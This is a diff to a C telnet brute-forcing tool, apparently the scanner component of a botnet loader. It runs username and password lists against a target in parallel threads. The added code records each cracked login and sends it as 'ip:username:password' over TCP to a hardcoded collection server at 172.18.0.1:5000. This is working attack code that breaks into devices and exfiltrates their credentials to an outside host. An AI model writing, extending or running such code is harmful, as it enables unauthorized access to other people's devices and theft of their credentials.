@@ -49,6 +49,7 @@
  * For compile: gcc -o brute_telnet brute_telnet.c -pthread
  *
  */
+#define _GNU_SOURCE
 #include "loader.h"
 
 #include <stdlib.h>
@@ -68,6 +69,7 @@
 uint8_t verbose = 0;
 struct timespec start, finish;
 double elapsed;
+char *resultuser, *resultpass = NULL;
 
 void print_usage(char* pname) {
 	printf("\nUsage: %s <target ip> <port> <userfile> <passfile> <n thread> [options]\n\n"
@@ -199,7 +201,14 @@ finish: //TODO: complete this
 	elapsed = (finish.tv_sec - start.tv_sec);
 	elapsed += (finish.tv_nsec - start.tv_nsec) / 1000000000.0;
 	printf("Done in %.2f seconds\n", elapsed);
-	return 0;
+
+	if (!resultpass || !resultuser) return 0;
+	int rc = 0;
+	if (report(resultuser, resultpass, argv[1]) != 0)
+		rc = 1;
+	free(resultuser);
+	free(resultpass);
+	return rc;
 }
 
 char* getentry(FILE* fd, char* line) {
@@ -252,10 +261,9 @@ void* t_conn(void* t_args) {
 	struct sockaddr_in* ipv4 = (struct sockaddr_in *)tdata->tel_addr->ai_addr;
 	struct sockaddr* sock = tdata->tel_addr->ai_addr;
 	if (1 || tdata->verbose == 1) { // i wanna print anyways for now
-		printf("telnet://%s@%s:%d %s\n",
+		printf("telnet://%s@%s %s\n",
 				tdata->username,
 				inet_ntop(tdata->tel_addr->ai_family, (void*)&ipv4->sin_addr, ipstr, sizeof(ipstr)),
-				tdata->tel_addr->ai_protocol,
 				tdata->password);
 	}
 
@@ -352,10 +360,12 @@ uint8_t trycredentials(int sockfd, char *username, char *password) {
 						} // send password
 					case 3:
 						clock_gettime(CLOCK_MONOTONIC, &finish);
+						resultuser = strdup(username);
+						resultpass = strdup(password);
 						return 0; // got prompt :)
 					default: break;
 				}
-				flag = level; //TODO: this is useless from what i can see so far
+				flag = level;
 			} else {
 				if (parse((char*)buff_r, 3) == 4) {
 					return 1; // bad creds, no login :/
@@ -440,4 +450,50 @@ void negotiate(int sock, unsigned char* buf, int len) {
 	if ((rc = send(sock, buf, len, 0)) < 0) {
 		perror("send error in negotiate");
 	}
+}
+
+int report(char* username, char* password, char* ip) {
+	struct addrinfo *report_addr;
+	int sockfd;
+	char* report_ip = "172.18.0.1"; // WARNING: hardcoded for now
+	char* report_port = "5000";
+	if (getaddrinfo(report_ip, report_port, NULL, &report_addr) < 0) {
+		perror("getaddrinfo error\n");
+		return 1;
+	}
+	struct sockaddr_in* ipv4 = (struct sockaddr_in *)report_addr->ai_addr;
+	struct sockaddr* sock = report_addr->ai_addr;
+
+	if ( (sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
+		perror("socket creation error\n");
+	}
+
+	if ( (connect(sockfd, sock, sizeof(*sock))) < 0) {
+		perror("socket connection error\n");
+	}
+
+	size_t len = strlen(ip) + 1      // ":"
+			   + strlen(username) + 1 // ":"
+			   + strlen(password) + 1;  // final '\0'
+
+	char *report_info = malloc(len);
+	if (!report_info) {
+		perror("malloc error\n");
+		return 1;
+	}
+
+	snprintf(report_info, len, "%s:%s:%s", ip, username, password);
+
+	int rc;
+	if ((rc = sendch(sockfd, report_info)) < 0 ) {
+		printf("sendch error\n");
+		return 4;
+	}
+
+	printf("sent %s\n", report_info);
+
+	freeaddrinfo(report_addr);
+	free(report_info);
+	close(sockfd);
+	return 0;
 }
